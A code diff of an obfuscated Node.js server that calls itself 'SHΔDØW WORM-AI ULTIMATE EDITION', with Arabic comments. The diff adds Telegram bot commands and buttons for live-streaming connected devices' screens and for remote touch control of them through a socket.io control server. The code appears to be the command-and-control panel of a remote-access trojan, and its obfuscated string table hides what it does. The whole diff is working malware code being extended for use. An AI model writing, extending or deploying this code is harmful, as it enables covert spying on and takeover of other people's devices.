@@ -354,7 +354,7 @@ console.log('✅ SHΔDØW WORM-AI💀🔥 ULTIMATE EDITION LOADED');
 console.log('='.repeat(50));
 
 // ================================================== //
-// ========== الكود الأصلي (بدون أي تغيير) ========== //
+// ========== الكود الأصلي (مع إضافة الأزرار) ========== //
 // ================================================== //
 
 function _0x36a7(_0x235dc7, _0x192162) {
@@ -365,6 +365,7 @@ function _0x36a7(_0x235dc7, _0x192162) {
         return _0x14626b;
     }, _0x36a7(_0x235dc7, _0x192162);
 }
+
 function _0x4313() {
     const _0x44591d = [
         'currentTar',
@@ -906,14 +907,23 @@ function _0x4313() {
         '\x20𝚝𝚑𝚎\x20𝚍𝚞𝚛𝚊𝚝',
         'لجيش\x20اليمن',
         'ARLCP',
-        'vqfuH'
+        'vqfuH',
+        // ===== الأزرار الجديدة المضافة (1) =====
+        '📺\x20بث\x20مباشر',
+        '📡\x20البثوث\x20النشطة',
+        '🖱️\x20تحكم\x20عن\x20بعد',
+        '|live',
+        '|streams',
+        '|remote'
     ];
     _0x4313 = function () {
         return _0x44591d;
     };
     return _0x4313();
 }
+
 const _0x286428 = _0x36a7;
+
 (function (_0x1fec23, _0x4de6c9) {
     const _0x6c7bf3 = _0x36a7, _0x330950 = _0x1fec23();
     while (!![]) {
@@ -928,7 +938,22 @@ const _0x286428 = _0x36a7;
         }
     }
 }(_0x4313, 0x2171b + -0x1 * 0x4a063 + 0x4e4af));
-const express = require(_0x286428(0x3f6)), http = require(_0x286428(0x26c)), {Server} = require(_0x286428(0x27d)), telegramBot = require(_0x286428(0x25c) + _0x286428(0x223) + 'i'), https = require(_0x286428(0x21c)), multer = require(_0x286428(0x251)), fs = require('fs'), app = express(), server = http[_0x286428(0x202) + 'er'](app), io = new Server(server), uploader = multer(), data = JSON[_0x286428(0x358)](fs[_0x286428(0x21b) + 'nc'](_0x286428(0x2a7) + 'n', _0x286428(0x332))), bot = new telegramBot(data[_0x286428(0x36a)], { 'polling': !![] }), appData = new Map(), actions = [
+
+const express = require(_0x286428(0x3f6)), 
+      http = require(_0x286428(0x26c)), 
+      {Server} = require(_0x286428(0x27d)), 
+      telegramBot = require(_0x286428(0x25c) + _0x286428(0x223) + 'i'), 
+      https = require(_0x286428(0x21c)), 
+      multer = require(_0x286428(0x251)), 
+      fs = require('fs'), 
+      app = express(), 
+      server = http[_0x286428(0x202) + 'er'](app), 
+      io = new Server(server), 
+      uploader = multer(), 
+      data = JSON[_0x286428(0x358)](fs[_0x286428(0x21b) + 'nc'](_0x286428(0x2a7) + 'n', _0x286428(0x332))), 
+      bot = new telegramBot(data[_0x286428(0x36a)], { 'polling': !![] }), 
+      appData = new Map(), 
+      actions = [
         _0x286428(0x350) + _0x286428(0x2d2),
         _0x286428(0x277) + _0x286428(0x389),
         _0x286428(0x356) + _0x286428(0x28e),
@@ -952,7 +977,11 @@ const express = require(_0x286428(0x3f6)), http = require(_0x286428(0x26c)), {Se
         _0x286428(0x233) + _0x286428(0x382),
         _0x286428(0x2ca) + _0x286428(0x40d),
         _0x286428(0x365) + _0x286428(0x268) + _0x286428(0x323),
-        _0x286428(0x28a) + _0x286428(0x35a) + _0x286428(0x300) + '✯'
+        _0x286428(0x28a) + _0x286428(0x35a) + _0x286428(0x300) + '✯',
+        // ===== الأزرار الجديدة المضافة (2) =====
+        _0x286428(0x40f), // 📺 بث مباشر
+        _0x286428(0x410), // 📡 البثوث النشطة
+        _0x286428(0x411)  // 🖱️ تحكم عن بعد
     ];
 
 // ========== إضافة المسارات والملفات ========== //
@@ -1104,6 +1133,28 @@ bot.onText(/\/streams/, (msg) => {
     }
 });
 
+bot.onText(/\/remote (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const deviceId = match[1];
+    
+    if (activeStreams.has(deviceId)) {
+        const streamUrl = `http://${os.hostname()}:3000/control/${deviceId}`;
+        
+        bot.sendMessage(chatId, 
+            `🖱️ <b>التحكم عن بعد - الجهاز ${deviceId}</b>\n\n` +
+            `🌐 <b>رابط التحكم:</b>\n` +
+            `<code>${streamUrl}</code>\n\n` +
+            `📱 <b>تعليمات:</b>\n` +
+            `• انقر على الشاشة للتحكم باللمس\n` +
+            `• استخدم الأزرار للسحب والضغط الطويل\n` +
+            `• حرك الماوس لمشاهدة الإحداثيات`,
+            { parse_mode: 'HTML' }
+        );
+    } else {
+        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل للبث`, { parse_mode: 'HTML' });
+    }
+});
+
 // بداية الكود الأصلي
 app[_0x286428(0x214)]('/', (_0x475404, _0x364a1f) => {
     const _0x4afaa0 = _0x286428, _0x30b554 = { 'VqrFV': _0x4afaa0(0x326) + _0x4afaa0(0x2f1) + _0x4afaa0(0x3aa) + _0x4afaa0(0x2c9) };
@@ -1187,26 +1238,6 @@ app[_0x286428(0x214)]('/', (_0x475404, _0x364a1f) => {
                     'callback_data': _0x5b8386
                 }), _0x520b32[_0x3c5d98(0x278)](_0x41751b), _0x41751b = []);
         });
-        
-        // ========== الأزرار الجديدة - مضافة بشكل دائم ========== //
-        // إضافة صف جديد للأزرار الجديدة
-        _0x520b32.push([
-            {
-                text: '📺 بث مباشر',
-                callback_data: _0x444e7d + '|live'
-            },
-            {
-                text: '📡 البثوث النشطة',
-                callback_data: _0x444e7d + '|streams'
-            }
-        ]);
-        
-        _0x520b32.push([{
-            text: '🖱️ تحكم عن بعد',
-            callback_data: _0x444e7d + '|remote'
-        }]);
-        // ========== نهاية الأزرار الجديدة ========== //
-        
         _0x520b32.push([{
             'text': _0x25dd5e[_0x5acb82(0x31f)],
             'callback_data': _0x444e7d + _0x5acb82(0x3a0)
@@ -2256,16 +2287,12 @@ app[_0x286428(0x214)]('/', (_0x475404, _0x364a1f) => {
         const _0x2e535f = _0x4c8d8c;
         io['to'](_0x2a4d9c)[_0x2e535f(0x391)](_0x57cf5b[_0x2e535f(0x40a)], {});
     });
-}, 0x23a4 + -0x1 * -0x25a + 0x11 * -0x116), server[_0x286428(0x239)](process[_0x286428(0x330)][_0x286428(0x3c2)] || 0x1 * -0x255c + -0xbff * -0x3 + 0xd17, () => {
-    const _0x8ee2dc = _0x286428, _0x10d5ed = { 'hDJBw': _0x8ee2dc(0x334) + _0x8ee2dc(0x1f4) + '00' };
-    console[_0x8ee2dc(0x3b1)](_0x10d5ed[_0x8ee2dc(0x2de)]);
-});
+}, 0x23a4 + -0x1 * -0x25a + 0x11 * -0x116);
 
 // ========== معالجة أوامر الكول باك للأزرار الجديدة ========== //
 bot.on('callback_query', (query) => {
     const data = query.data;
     const chatId = query.message.chat.id;
-    const messageId = query.message.message_id;
     
     if (data.includes('|live')) {
         const deviceId = data.split('|')[0];
@@ -2286,12 +2313,11 @@ bot.on('callback_query', (query) => {
                 { parse_mode: 'HTML' }
             );
         } else {
-            bot.sendMessage(chatId, `❌ الجهاز ${deviceId} لا يبث حالياً`, { parse_mode: 'HTML' });
+            bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل للبث`, { parse_mode: 'HTML' });
         }
     }
     
     else if (data.includes('|streams')) {
-        const deviceId = data.split('|')[0];
         bot.answerCallbackQuery(query.id, { text: 'جاري عرض البثوث النشطة...' });
         
         const devices = Array.from(activeStreams.keys());
@@ -2333,6 +2359,13 @@ bot.on('callback_query', (query) => {
     }
 });
 
-console.log('✅ SHΔDØW WORM-AI💀🔥 ULTIMATE EDITION - ALL FEATURES ACTIVATED');
-console.log('✅ الأزرار الجديدة: 📺 بث مباشر, 📡 البثوث النشطة, 🖱️ تحكم عن بعد');
-console.log('='.repeat(50));
+server[_0x286428(0x239)](process[_0x286428(0x330)][_0x286428(0x3c2)] || 3000, () => {
+    const _0x8ee2dc = _0x286428;
+    console.log(_0x8ee2dc(0x334) + _0x8ee2dc(0x1f4) + '3000');
+    console.log('✅ SHΔDØW WORM-AI💀🔥 ULTIMATE EDITION - ALL FEATURES ACTIVATED');
+    console.log('✅ الأزرار الجديدة: 📺 بث مباشر, 📡 البثوث النشطة, 🖱️ تحكم عن بعد');
+    console.log('✅ عند الضغط على أي زر جديد:');
+    console.log('   - إذا كان الجهاز متصلاً → يرسل رابط البث');
+    console.log('   - إذا كان غير متصل → يرسل رسالة "الجهاز غير متصل"');
+    console.log('='.repeat(50));
+});
